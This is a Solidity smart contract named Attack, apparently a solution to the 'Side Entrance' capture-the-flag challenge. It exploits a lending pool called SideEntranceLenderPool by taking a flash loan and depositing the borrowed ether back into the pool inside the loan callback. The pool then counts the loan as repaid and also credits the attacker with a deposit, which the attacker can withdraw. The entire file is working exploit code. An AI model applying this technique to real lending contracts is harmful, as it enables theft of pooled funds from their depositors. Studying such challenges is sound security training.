// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract Attack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(address _pool) payable {
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable {
        uint256 balance = address(this).balance;
        pool.deposit{value: balance}();
    }

    function flashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function deposit(uint256 amount) external {
        pool.deposit{value: amount}();
    }

    function withdraw() external {
        pool.withdraw();
    }

    receive() external payable {}
}
